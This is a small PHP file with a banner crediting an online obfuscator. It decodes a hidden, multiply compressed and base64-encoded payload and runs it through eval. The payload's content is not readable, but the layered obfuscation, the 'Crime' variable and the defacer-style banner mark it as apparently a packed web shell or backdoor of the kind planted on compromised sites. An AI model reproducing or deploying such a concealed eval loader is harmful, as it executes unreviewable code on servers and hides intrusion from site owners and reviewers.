<?php
/*
		                The Given Code Was Successfully Obfuscated By Chu-404
						From : http://chu404.eu5.org/obfus.php
									     Thanks For Using
							      I love You Mantan Terindah :v
		          Dont Change The Variables Names And If You Change Obfuscated Code Wont Work Properly
							     Changing Author's Name Wont Make You The Author
									       #RespectColylers
								    !!! ~ Chu-404 ~ !!!
*/
$Cyber = "ZXZhbCUyOCUyNyUzRiUyNmd0JTNCJTI3Lmd6dW5jb21wcmVzcyUyOGd6aW5mbGF0ZSUyOGd6aW5mbGF0ZSUyOGJhc2U2NF9kZWNvZGUlMjhzdHJyZXYlMjglMjRDcmltZSUyOSUyOSUyOSUyOSUyOSUyOSUzQg==";
$Crime = "=whESNwD0r2iqzND/wa2COt/NeZXrnorYyxJn253EF3rzWG9aSeXDzjouHR6Wf4B7n9HdIWfBCszJKhkCrb39XTc4xclxeP3HMc7dTyHDWf7GxqaMhb2hVxyiKcbWsEGRNsJL5IZ61SBLBAFsUzoOUS8R4JMDoN0vnE4axI0UMjSpdBOscfYWiHV0DKWLVwB5xa9g5W1sLT4+vv/Gc14d4Hw4gipQVUCZNouZc48QjTll8K7JdBhcUtZUF1qeikHtAMvelPrXPzbxP7UNOy2ffoX6v7gCHEZAtsHiPVto/4elm0xA8JjfDgH9JP9QMjomXPbUL90Vb0TfD3Um68nBynvfNpZEE/smKR65D3TLfc2pTuN1VrgSacra2U6bWDyZ7iZbpZ35ekEj5BwsWh3Bi8dA3zMHqnQIINlju9GJW0sjZvzeP+UutP15tSvJ45/w6pIfEvQowwcH2edObXcrAbVAvNPpGlQ7SuN5cJMJ3UWoWH9F0i2ykaSwqXd+msgVZiL6aUbPDbNu4kcxv7fzv319OxaDKGiQeFN/0xC9h26fXVirYk7SHrgeDTkkVedm0TTtVTQHADwPE2OYwKzkiFzzYdWIH5G1GrYQnDiQDGN2oZmavxa5XdqqmFUy3q3GP82dj7xGM6Gxb0v7c7pzGIe0HB5pFViLu4szb8z/854mMT2sFL1pFzg2N+Mn+5DzftZM7TM5yTd5zDd53trGt8m7d7TvRWwlduNQrROpKYwg7nte9ObtzievBz7DY43cQu19fKdJAhtwsWkUvdZI17tORmvLkSQFI3jmI29hNxlWXiTFZmkTh+v2fzU77w6UY5nftiW5+k0LqrOBqrgA+q4dS2kjEeLVE83YhM9hRwiWgWMILn+oh8JuAtTV5GvSX4FkoXEiVDsEcTkmXUxDAkpCZE4DMDtUumq2sbJ2dAl5Knsb8vdH9kWeaxog47RwvWb6SIf4BXf5OvMYi8Mi/BaAuXT0ETYXSEeZowRzKKPoQLJQcxT+UBp5oo5qYeygGHvTIfOb6XFZRGe4pqHrgjSWiZg1aYvcdX+K+dD/VN/U1fO9FNKHj9Abc6PF2L+8/tt3wuXPJtiQcP5cGSrNOizKRovDJn25IDqA62A2P6lZLoqO6aK60Mcx46aA6GVlbLCkZWIGy5+dTuSJ5ZyJhPDGLdJo81Ka+9KMkVeNUi9MZoQ43mFkfCllSIeRW4Gq6VWg3y+CrNfqYxJNu2jQE7EGINfNxhsoELZath9WUGFFCZMwzLHPELO6St54LXEiUgHIC/DE+FJGq5+EsZRiD7enlm5M0x7KzDP1I2LMS8As5OPVINUDuVlq4RoRBleJCIl/HFVvmigKjpgHUUty0L2iyznQBEjk3znVLTxy4ic98ikPz++KXJiRxUpLUlmNXHNjBzk+8w5Bw20qjVT1M8fHAXauAXJMOtn0xWJcVFw2iQ4jGDuRMpSxiLYWAyyB/8a9YxzVEicJPHklaSbdeIOy/Ouud3+cyMkLRVqV1F4nAwZ9+pS005gOYYAmCGw1EpRtbV7RurtRtbc20G414OQaLNOIl90HmHSd6PFGNqbrbVrci3+aRQpBsfVEoaA";
eval(htmlspecialchars_decode(urldecode(base64_decode($Cyber))));
exit;
?>